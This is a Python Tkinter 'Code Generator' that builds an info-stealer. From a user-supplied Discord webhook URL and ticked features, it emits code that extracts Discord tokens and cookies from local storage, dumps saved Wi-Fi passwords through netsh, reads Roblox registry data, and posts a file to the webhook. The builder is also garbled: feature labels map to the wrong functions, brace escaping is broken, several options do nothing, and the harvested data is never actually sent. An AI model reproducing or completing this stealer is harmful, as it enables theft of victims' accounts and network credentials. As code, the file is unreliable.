import tkinter as tk
from tkinter import messagebox, filedialog
import os
import requests
import sqlite3
import winreg as reg
import subprocess  # for Wi-Fi info
import json

def generate_code(selected_features, webhook_url, image_path):
    """Generates Python code based on selected features."""
    # Ensure that the webhook URL is treated as a string (use single quotes to avoid issues)
    code = f"""import os
import platform
import socket
import requests
import json
import re
import sqlite3
import winreg as reg
import subprocess  # For Wi-Fi info

# Discord webhook URL
WEBHOOK_URL = '{webhook_url}'

def get_system_info():
    '''Gather system information'''
    return {{
        "OS": platform.system(),
        "OS Version": platform.version(),
        "Architecture": platform.architecture(),
        "Hostname": socket.gethostname(),
        "IP Address": socket.gethostbyname(socket.gethostname())
    }}\n"""
    
    # Append selected features to the code
    if 'System Info' in selected_features:
        code += """
def get_discord_tokens():
    '''Retrieve Discord tokens from local storage'''
    tokens = []
    paths = {{
        "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage", "leveldb"),
        "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage", "leveldb"),
        "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage", "leveldb")
    }}

    for platform, path in paths.items():
        try:
            for file_name in os.listdir(path):
                if file_name.endswith((".log", ".ldb")):
                    with open(os.path.join(path, file_name), 'r', errors='ignore') as file:
                        lines = [line.strip() for line in file.readlines() if line.strip()]
                        for line in lines:
                            tokens.extend(re.findall(r"[\w-]{{24}}\.[\w-]{{6}}\.[\w-]{{27}}", line))
                            tokens.extend(re.findall(r"mfa\.[\w-]{{84}}", line))
        except Exception as e:
            print(f"Error reading Discord tokens: {e}")
            continue
    return tokens
"""
    if 'Discord Info' in selected_features:
        code += """
def get_cookies():
    '''Retrieve cookies from local storage'''
    cookies = {{}}
    paths = {{

        "Discord": os.path.join(os.getenv('APPDATA'), "discord", "Local Storage"),
        "Discord Canary": os.path.join(os.getenv('APPDATA'), "discordcanary", "Local Storage"),
        "Discord PTB": os.path.join(os.getenv('APPDATA'), "discordptb", "Local Storage")
    }}

    for platform, path in paths.items():
        try:
            for file_name in os.listdir(path):
                if file_name.endswith(".sqlite"):
                    conn = sqlite3.connect(os.path.join(path, file_name))
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies")
                    cookies.update({f"{host_key}{name}": value for host_key, name, value in cursor.fetchall()})
                    conn.close()
        except Exception as e:
            print(f"Error reading cookies: {e}")
            continue
    return cookies
"""
    if 'WiFi Info' in selected_features:
        code += """
def get_wifi_info():
    '''Retrieve Wi-Fi information from the system'''
    wifi_info = []
    try:
        # Using netsh command to get Wi-Fi profiles
        result = subprocess.run(['netsh', 'wlan', 'show', 'profiles'], capture_output=True, text=True)
        profiles = [line.split(":")[1][1:-1] for line in result.stdout.splitlines() if "All User Profile" in line]
        for profile in profiles:
            wifi = {"SSID": profile}
            result = subprocess.run(['netsh', 'wlan', 'show', 'profile', profile], capture_output=True, text=True)
            for line in result.stdout.splitlines():
                if "Key Content" in line:
                    wifi["Password"] = line.split(":")[1][1:-1]
            wifi_info.append(wifi)
    except Exception as e:
        print(f"Error retrieving Wi-Fi info: {e}")
    return wifi_info
"""
    if 'Roblox Info' in selected_features:
        code += """
def get_roblox_info():
    '''Retrieve Roblox-related information'''
    roblox_info = {{}}
    try:
        roblox_path = os.path.join(os.getenv('APPDATA'), 'Roblox')
        if os.path.exists(roblox_path):
            roblox_info["Roblox Directory"] = roblox_path
        # Try getting Roblox registry information (if available)
        reg_path = r"SOFTWARE\\WOW6432Node\\Roblox"
        registry_key = reg.OpenKey(reg.HKEY_LOCAL_MACHINE, reg_path)
        install_path, _ = reg.QueryValueEx(registry_key, "InstallPath")
        roblox_info["Roblox Installation Path"] = install_path
        reg.CloseKey(registry_key)
    except Exception as e:
        print(f"Error gathering Roblox info: {e}")
    return roblox_info
"""
    if image_path:
        code += f"""
def send_image():
    '''Send an image to Discord via webhook'''
    url = '{webhook_url}'
    files = {{'file': open('{image_path}', 'rb')}}
    data = {{
        'content': 'Here is an image!'
    }}
    response = requests.post(url, data=data, files=files)
    print(response.status_code, response.text)
"""

    return code

def on_build_button_click():
    """Handle the build button click event."""
    webhook_url = webhook_entry.get()
    if not webhook_url:
        messagebox.showerror("Error", "Please enter a valid webhook URL")
        return

    selected_features = []
    if system_info_var.get():
        selected_features.append('System Info')
    if discord_info_var.get():
        selected_features.append('Discord Info')
    if wifi_info_var.get():
        selected_features.append('WiFi Info')
    if roblox_info_var.get():
        selected_features.append('Roblox Info')
    if minecraft_info_var.get():
        selected_features.append('Minecraft Info')
    if valorant_info_var.get():
        selected_features.append('Valorant Info')
    if steam_info_var.get():
        selected_features.append('Steam Info')
    if epic_games_info_var.get():
        selected_features.append('Epic Games Info')
    
    if not selected_features:
        messagebox.showerror("Error", "Please select at least one feature")
        return

    # Generate the code based on selected features and webhook URL
    code = generate_code(selected_features, webhook_url, image_path)

    # Display the generated code
    code_output.delete(1.0, tk.END)  # Clear previous code
    code_output.insert(tk.END, code)  # Display new code

def on_select_image_button_click():
    """Handle the image selection button click event."""
    global image_path
    image_path = filedialog.askopenfilename(title="Select an image", filetypes=[("Image files", "*.png;*.jpg;*.jpeg;*.gif")])
    if image_path:
        image_path_label.config(text=f"Selected Image: {os.path.basename(image_path)}")

# GUI setup
root = tk.Tk()
root.title("Code Generator")
root.geometry("600x700")
root.config(bg="black")

# Title
title_label = tk.Label(root, text="Select Features and Enter Webhook URL", fg="white", bg="black", font=("Helvetica", 16))
title_label.grid(row=0, column=0, columnspan=3, pady=20)

# Feature selection checkboxes (arranged in a grid layout)
system_info_var = tk.BooleanVar()
discord_info_var = tk.BooleanVar()
wifi_info_var = tk.BooleanVar()
roblox_info_var = tk.BooleanVar()
minecraft_info_var = tk.BooleanVar()
valorant_info_var = tk.BooleanVar()
steam_info_var = tk.BooleanVar()
epic_games_info_var = tk.BooleanVar()

system_info_check = tk.Checkbutton(root, text="System Info", variable=system_info_var, fg="white", bg="black", selectcolor="purple")
discord_info_check = tk.Checkbutton(root, text="Discord Info", variable=discord_info_var, fg="white", bg="black", selectcolor="purple")
wifi_info_check = tk.Checkbutton(root, text="Wi-Fi Info", variable=wifi_info_var, fg="white", bg="black", selectcolor="purple")
roblox_info_check = tk.Checkbutton(root, text="Roblox Info", variable=roblox_info_var, fg="white", bg="black", selectcolor="purple")
minecraft_info_check = tk.Checkbutton(root, text="Minecraft Info", variable=minecraft_info_var, fg="white", bg="black", selectcolor="purple")
valorant_info_check = tk.Checkbutton(root, text="Valorant Info", variable=valorant_info_var, fg="white", bg="black", selectcolor="purple")
steam_info_check = tk.Checkbutton(root, text="Steam Info", variable=steam_info_var, fg="white", bg="black", selectcolor="purple")
epic_games_info_check = tk.Checkbutton(root, text="Epic Games Info", variable=epic_games_info_var, fg="white", bg="black", selectcolor="purple")

system_info_check.grid(row=1, column=0, padx=20, pady=10)
discord_info_check.grid(row=2, column=0, padx=20, pady=10)
wifi_info_check.grid(row=1, column=1, padx=20, pady=10)
roblox_info_check.grid(row=2, column=1, padx=20, pady=10)
minecraft_info_check.grid(row=1, column=2, padx=20, pady=10)
valorant_info_check.grid(row=2, column=2, padx=20, pady=10)
steam_info_check.grid(row=3, column=0, padx=20, pady=10)
epic_games_info_check.grid(row=3, column=1, padx=20, pady=10)

# Webhook URL entry
webhook_label = tk.Label(root, text="Enter Webhook URL:", fg="white", bg="black", font=("Helvetica", 12))
webhook_label.grid(row=4, column=0, columnspan=3, pady=10)

webhook_entry = tk.Entry(root, width=50, fg="black", bg="white", font=("Helvetica", 12))
webhook_entry.grid(row=5, column=0, columnspan=3, pady=10)

# Select image button
select_image_button = tk.Button(root, text="Select Image", command=on_select_image_button_click, fg="white", bg="purple", font=("Helvetica", 14))
select_image_button.grid(row=6, column=0, columnspan=3, pady=10)

# Image path label
image_path_label = tk.Label(root, text="No image selected", fg="white", bg="black", font=("Helvetica", 12))
image_path_label.grid(row=7, column=0, columnspan=3, pady=5)

# Build button
build_button = tk.Button(root, text="Build", command=on_build_button_click, fg="white", bg="purple", font=("Helvetica", 14))
build_button.grid(row=8, column=0, columnspan=3, pady=20)

# Code output area
code_output_label = tk.Label(root, text="Generated Code:", fg="white", bg="black", font=("Helvetica", 12))
code_output_label.grid(row=9, column=0, columnspan=3, pady=10)

code_output = tk.Text(root, width=70, height=10, wrap=tk.WORD, fg="black", bg="white", font=("Courier", 10))
code_output.grid(row=10, column=0, columnspan=3, pady=10)

# Start the GUI loop
root.mainloop()
